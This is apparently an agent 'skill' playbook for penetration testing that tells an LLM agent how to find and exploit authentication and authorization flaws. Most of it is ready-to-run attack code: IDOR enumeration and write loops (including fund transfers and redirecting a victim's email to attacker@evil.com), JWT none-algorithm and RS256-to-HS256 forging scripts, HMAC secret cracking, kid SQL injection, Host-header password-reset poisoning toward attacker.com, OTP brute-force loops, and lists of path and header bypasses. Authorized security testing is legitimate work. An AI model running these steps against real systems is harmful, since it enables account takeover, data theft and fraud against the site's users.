# Authentication & Authorization Bypass Skill

## Overview
Complete methodology for detecting and exploiting authentication and authorization flaws.
Covers IDOR, JWT attacks (none algorithm, key confusion, HMAC brute-force), session
fixation, password reset poisoning, 2FA bypass, forced browsing, privilege escalation,
and broken access control patterns across web applications and APIs.
This is the LLM agent's step-by-step playbook — follow it top to bottom.

## Scope Rules
1. Only test accounts and endpoints explicitly in scope.
2. Never modify or delete other users' data — read-only proof of access.
3. Use provided test accounts where possible; create your own test accounts.
4. Avoid account lockout — use conservative brute-force limits.
5. Record ALL authentication/authorization tests and results.

---

## Phase 1: IDOR — Insecure Direct Object References

### 1.1 Identifying IDOR Targets
Look for predictable identifiers in API endpoints and parameters:
```
GET /api/users/123/profile          → user ID
GET /api/orders/ORD-0001            → order ID
GET /api/documents/550e8400-...     → UUID (less predictable but still testable)
GET /api/invoices?id=456            → query parameter
POST /api/messages {"thread_id": 789}  → request body
GET /files/download?file_id=100     → file reference
```

### 1.2 Horizontal IDOR (Same Privilege Level)
Access other users' resources at the same privilege level:

```bash
# Authenticate as user A (ID: 100), try to access user B's data (ID: 101)

# Direct ID manipulation
curl -s -b 'session=USER_A_TOKEN' http://target/api/users/101/profile
curl -s -b 'session=USER_A_TOKEN' http://target/api/users/101/orders

# Sequential enumeration
for id in $(seq 1 200); do
  curl -s -b 'session=USER_A_TOKEN' "http://target/api/users/$id/profile" -o "user_$id.json"
done

# Parameter-based IDOR
curl -s -b 'session=USER_A_TOKEN' 'http://target/api/documents?owner_id=101'
```

### 1.3 Vertical IDOR (Privilege Escalation)
Access admin/higher-privilege resources as a regular user:

```bash
# As regular user, access admin endpoints
curl -s -b 'session=USER_TOKEN' http://target/api/admin/users
curl -s -b 'session=USER_TOKEN' http://target/api/admin/settings
curl -s -b 'session=USER_TOKEN' http://target/api/admin/logs

# Modify own role via IDOR
curl -s -X PUT -b 'session=USER_TOKEN' http://target/api/users/100 \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
```

### 1.4 IDOR in Write Operations
```bash
# Modify another user's data
curl -s -X PUT -b 'session=USER_A_TOKEN' http://target/api/users/101/profile \
  -d '{"email":"attacker@evil.com"}'

# Delete another user's resource
curl -s -X DELETE -b 'session=USER_A_TOKEN' http://target/api/users/101/posts/5

# Transfer funds from another account
curl -s -X POST -b 'session=USER_A_TOKEN' http://target/api/transfer \
  -d '{"from_account":"101","to_account":"100","amount":"1000"}'
```

### 1.5 IDOR Bypass Techniques
When direct IDOR is blocked:
```bash
# Add parameter wrapping
GET /api/users/101                   → 403
GET /api/users/101?admin=true        → 200?
GET /api/users/101.json              → different handler?

# HTTP method switching
GET /api/users/101     → 403
POST /api/users/101    → 200?
PUT /api/users/101     → 200?

# Version switching
/api/v2/users/101      → 403
/api/v1/users/101      → 200? (old version less protected)

# Parameter pollution
/api/users?id=100&id=101   → which one wins?

# Case variation / encoding
/api/users/101
/api/Users/101
/api/users/101%00
```

---

## Phase 2: JWT Attacks

### 2.1 JWT Structure Analysis
```bash
# Decode JWT (header.payload.signature — base64url encoded)
jwt_tool <JWT_TOKEN>

# Manual decode
echo "<header>" | base64 -d
echo "<payload>" | base64 -d

# Key fields to examine:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"user123","role":"user","iat":1234567890,"exp":1234571490}
```

### 2.2 None Algorithm Attack
Forge tokens when the server accepts `alg: none`:

```bash
# Using jwt_tool
jwt_tool <JWT_TOKEN> -X a

# Manual Python approach
python3 -c "
import jwt
# Decode existing token to get claims
claims = jwt.decode('<JWT_TOKEN>', options={'verify_signature': False})
claims['role'] = 'admin'
claims['sub'] = 'admin'
# Encode with none algorithm
forged = jwt.encode(claims, '', algorithm='none')
print(forged)
"

# Variations to try:
# alg: "none"
# alg: "None"
# alg: "NONE"
# alg: "nOnE"
# Remove signature entirely (token ends with a trailing dot)
```

### 2.3 HMAC Key Confusion (RS256 → HS256)
When the server uses RS256, switch to HS256 and sign with the public key:

```bash
# If server public key is known (often at /jwks.json, /.well-known/jwks.json)
# Download public key
curl -s http://target/.well-known/jwks.json > jwks.json

# Convert JWKS to PEM
python3 -c "
from jwt.algorithms import RSAAlgorithm
import json
jwks = json.load(open('jwks.json'))
key = RSAAlgorithm.from_jwk(json.dumps(jwks['keys'][0]))
# Save as PEM
"

# Forge token using public key as HMAC secret
jwt_tool <JWT_TOKEN> -X k -pk public.pem

# Or manually:
python3 -c "
import jwt
claims = {'sub': 'admin', 'role': 'admin'}
with open('public.pem', 'r') as f:
    public_key = f.read()
forged = jwt.encode(claims, public_key, algorithm='HS256')
print(forged)
"
```

### 2.4 HMAC Secret Brute-Force
```bash
# Using jwt_tool
jwt_tool <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat (mode 16500)
# Format: <JWT_TOKEN> (the full token as-is)
echo '<JWT_TOKEN>' > jwt_hash.txt
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# Common weak secrets:
# secret, password, 123456, key, jwt_secret, changeme
# Also try: company name, app name, "supersecret"
```

### 2.5 JWK Header Injection
```bash
# Inject your own signing key in the JWT header
jwt_tool <JWT_TOKEN> -X i

# The forged token includes a JWK in the header containing your public key
# If the server trusts the embedded JWK, it verifies with attacker's key
```

### 2.6 Kid (Key ID) Injection
```bash
# SQL injection via kid parameter
# Header: {"alg":"HS256","kid":"' UNION SELECT 'attacker-secret' -- "}
# Server queries DB for key using kid → injects controlled secret

# Path traversal via kid
# Header: {"alg":"HS256","kid":"../../../../../../dev/null"}
# Sign with empty string (contents of /dev/null)

jwt_tool <JWT_TOKEN> -X k -pk /dev/null
```

---

## Phase 3: Session Management Attacks

### 3.1 Session Fixation
```bash
# 1. Attacker obtains a valid session token (by visiting the site)
# 2. Attacker forces victim to use this token (via URL, cookie injection)
# 3. Victim authenticates → session now associated with victim's account
# 4. Attacker uses the same token → has victim's session

# Test: Does the session token change after login?
# Before login: session=ABC123
# After login: session=ABC123 (VULNERABLE — same token)
# After login: session=XYZ789 (SAFE — token regenerated)

# Fixation via URL parameter
http://target/login?session_id=ATTACKER_TOKEN

# Fixation via subdomain cookie injection
# If attacker controls sub.target.com, set cookie for .target.com
```

### 3.2 Session Token Analysis
```bash
# Collect multiple session tokens and analyze for patterns
# Look for:
# - Sequential/predictable tokens
# - Timestamp-based tokens
# - Weak randomness
# - Encoded user data (base64 decode the token)

# Test token entropy
echo "TOKEN1" | base64 -d
echo "TOKEN2" | base64 -d
# Compare — are they incrementing? Timestamp-based?
```

### 3.3 Cookie Security Analysis
```bash
# Check cookie attributes
curl -v http://target/login 2>&1 | grep -i 'set-cookie'

# Verify:
# HttpOnly flag → prevents JavaScript access (XSS cookie theft)
# Secure flag → only sent over HTTPS
# SameSite → CSRF protection
# Path → scope limitation
# Expiry → session lifetime

# Missing HttpOnly → XSS can steal cookies
# Missing Secure → cookies sent over HTTP (MITM risk)
# Missing SameSite → CSRF possible
```

---

## Phase 4: Password Reset Flaws

### 4.1 Host Header Poisoning
```bash
# Password reset link uses Host header for URL generation
curl -X POST http://target/forgot-password \
  -H 'Host: attacker.com' \
  -d 'email=victim@target.com'

# If vulnerable, victim receives reset link pointing to attacker.com
# attacker.com logs the token when victim clicks

# Variations:
-H 'Host: attacker.com'
-H 'X-Forwarded-Host: attacker.com'
-H 'X-Original-URL: http://attacker.com/reset'
-H 'X-Forwarded-Server: attacker.com'
-H 'Forwarded: host=attacker.com'
```

### 4.2 Token Predictability
```bash
# Request multiple password reset tokens and analyze
# Look for:
# - Sequential tokens (incrementing numbers)
# - Timestamp-based tokens (Unix epoch → predictable)
# - Short tokens (brute-forceable)
# - Tokens that don't expire
# - Tokens that work multiple times

# Test token reuse
curl -X POST http://target/reset-password \
  -d 'token=RESET_TOKEN&new_password=test123'
# Try again with same token → should fail (one-time use)

# Test token expiry
# Request token → wait 24h → try using it → should fail
```

### 4.3 Parameter Manipulation
```bash
# Change email in reset request
POST /forgot-password
email=victim@target.com&email=attacker@evil.com
# Some apps send to last email, use first for lookup

# Hidden user ID parameter
POST /reset-password
token=VALID_TOKEN&user_id=ADMIN_ID&new_password=hacked

# Carbon copy
POST /forgot-password
email=victim@target.com&cc=attacker@evil.com
```

---

## Phase 5: 2FA/MFA Bypass

### 5.1 Direct Endpoint Access
```bash
# Skip 2FA page entirely — access post-auth pages directly
# Login → redirected to /2fa → manually navigate to /dashboard
curl -b 'session=POST_LOGIN_TOKEN' http://target/dashboard
curl -b 'session=POST_LOGIN_TOKEN' http://target/api/user/profile

# Some apps set "authenticated" flag before 2FA verification
```

### 5.2 Response Manipulation
```bash
# Intercept 2FA verification response
# Change HTTP status from 403 → 200
# Change JSON response from {"success":false} → {"success":true}
# Some client-side apps only check the response, not server state
```

### 5.3 Brute Force OTP
```bash
# 4-digit OTP → only 10,000 possibilities
# 6-digit OTP → 1,000,000 possibilities (still feasible without rate limiting)

# Test rate limiting
for code in $(seq -w 0000 9999); do
  curl -s -X POST http://target/verify-2fa \
    -b 'session=TOKEN' \
    -d "code=$code" &
done

# If no rate limit or account lockout → brute-force viable
```

### 5.4 Token Reuse
```bash
# Use a previously valid OTP code
# Some apps don't invalidate codes after use or have long validity windows

# Backup codes — try common defaults
# Codes: 000000, 123456, 111111
# Some apps accept backup codes instead of TOTP
```

### 5.5 2FA Disable Without Verification
```bash
# Try to disable 2FA without providing current 2FA code
curl -X POST -b 'session=TOKEN' http://target/api/settings/disable-2fa
curl -X DELETE -b 'session=TOKEN' http://target/api/settings/2fa
```

---

## Phase 6: Forced Browsing & Access Control

### 6.1 Admin Panel Discovery
```bash
# Common admin paths
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302

# Common admin URLs:
/admin, /admin/, /administrator/
/wp-admin/, /wp-login.php
/manage/, /management/
/console/, /dashboard/
/api/admin/, /api/v1/admin/
/graphql (query introspection for admin mutations)
/_debug/, /actuator/, /swagger-ui/
```

### 6.2 HTTP Method-Based Access Control Bypass
```bash
# Some apps only check authorization for GET, not other methods
curl -X GET http://target/admin/users       → 403
curl -X POST http://target/admin/users      → 200?
curl -X PUT http://target/admin/users       → 200?
curl -X PATCH http://target/admin/users     → 200?
curl -X OPTIONS http://target/admin/users   → 200? (reveals allowed methods)
curl -X HEAD http://target/admin/users      → 200? (no body but confirms access)

# Override method via headers
curl -X POST http://target/admin/users -H 'X-HTTP-Method-Override: GET'
curl -X POST http://target/admin/users -H 'X-Method-Override: PUT'
```

### 6.3 Path Traversal in Authorization
```bash
# Bypass path-based authorization checks
/admin/users              → 403
/admin/./users            → 200?
/admin/../admin/users     → 200?
/ADMIN/users              → 200? (case sensitivity)
/admin%2fusers            → 200? (URL encoding)
/admin;/users             → 200? (semicolon — Tomcat)
/admin/users..;/          → 200? (Spring)
/.;/admin/users           → 200? (Spring/Tomcat)
/admin/users%00           → 200? (null byte)
```

### 6.4 Header-Based Access Control Bypass
```bash
# Some apps trust proxy headers for internal access
curl http://target/admin -H 'X-Forwarded-For: 127.0.0.1'
curl http://target/admin -H 'X-Real-IP: 127.0.0.1'
curl http://target/admin -H 'X-Original-URL: /admin'
curl http://target/admin -H 'X-Custom-IP-Authorization: 127.0.0.1'
curl http://target/admin -H 'X-Forwarded-Host: localhost'
curl http://target/admin -H 'Forwarded: for=127.0.0.1'
curl http://target/admin -H 'Client-IP: 127.0.0.1'
```

### 6.5 API Versioning Bypass
```bash
# Older API versions may have weaker access controls
/api/v3/admin/users    → 403 (current, properly secured)
/api/v2/admin/users    → 200? (older, less restrictive)
/api/v1/admin/users    → 200? (legacy, possibly no auth check)
/api/admin/users       → 200? (unversioned endpoint)
```

---

## Phase 7: Privilege Escalation via Application Logic

### 7.1 Role Manipulation
```bash
# Modify role in registration
POST /api/register
{"username":"attacker","password":"pass123","role":"admin"}
{"username":"attacker","password":"pass123","isAdmin":true}
{"username":"attacker","password":"pass123","group":"administrators"}

# Modify role in profile update
PUT /api/users/me
{"role":"admin","privilege_level":9}

# Mass assignment — include extra fields
PUT /api/profile
{"name":"Attacker","email":"a@a.com","role":"admin","is_staff":true}
```

### 7.2 Function-Level Access Control
```bash
# Test every privileged function with unprivileged credentials
# Admin functions to test as regular user:
POST /api/admin/create-user
DELETE /api/admin/delete-user/123
PUT /api/admin/settings
GET /api/admin/export-data
POST /api/admin/bulk-operation
```

### 7.3 Multi-Step Process Bypass
```bash
# Some apps check authorization only on step 1, not subsequent steps
# Step 1: GET /admin/users → 403 (auth checked)
# Step 2: POST /admin/users/create → try directly (auth may not be checked)

# Password change without old password
POST /api/change-password
{"new_password":"hacked123"}
# Should require: {"old_password":"xxx","new_password":"hacked123"}
```

---

## Decision Tree — Auth Bypass Attack Flow

```
AUTHENTICATION/AUTHORIZATION TARGET
│
├── IDOR Testing (Phase 1)
│   ├── Find ID-based endpoints
│   ├── Test horizontal access (other users' data)
│   ├── Test vertical access (admin functions)
│   └── Test write operations (modify/delete)
│
├── JWT Testing (Phase 2) — if JWT used
│   ├── Decode and analyze token
│   ├── Try none algorithm
│   ├── Try key confusion (RS256→HS256)
│   ├── Brute-force HMAC secret
│   ├── Try JWK/kid injection
│   └── Modify claims (role, sub, exp)
│
├── Session Testing (Phase 3)
│   ├── Session fixation test
│   ├── Token predictability analysis
│   └── Cookie security audit
│
├── Password Reset (Phase 4)
│   ├── Host header poisoning
│   ├── Token analysis
│   └── Parameter manipulation
│
├── 2FA Bypass (Phase 5) — if 2FA present
│   ├── Direct endpoint skip
│   ├── Response manipulation
│   ├── OTP brute force
│   └── Disable without verification
│
├── Forced Browsing (Phase 6)
│   ├── Admin panel discovery
│   ├── HTTP method bypass
│   ├── Path traversal bypass
│   ├── Header-based bypass
│   └── API version bypass
│
└── Logic Flaws (Phase 7)
    ├── Role manipulation
    ├── Function-level access control
    └── Multi-step process bypass
```

---

## Evidence Collection
1. `evidence.json` — endpoint, bypass technique, proof of unauthorized access
2. `findings.json` — impact, CVSS, affected users/data
3. `creds.json` — compromised tokens/sessions (redacted)
4. HTTP request/response pairs proving unauthorized access
5. Screenshots of accessed data (redacted PII)

## MITRE ATT&CK Mappings
- T1078 — Valid Accounts
- T1556 — Modify Authentication Process
- T1548 — Abuse Elevation Control Mechanism
- T1110 — Brute Force

## Deep Dives
Load references when needed:
1. JWT attack vectors: `references/jwt_attacks.md`
2. IDOR patterns: `references/idor_patterns.md`
3. 2FA bypass techniques: `references/2fa_bypass.md`
4. Access control bypass matrix: `references/access_control.md`

## Success Criteria
- Authentication or authorization bypass confirmed with evidence
- Impact demonstrated (data access, privilege escalation)
- All bypass attempts documented (successful and failed)
- JWT/session/token analysis completed
- Remediation guidance provided
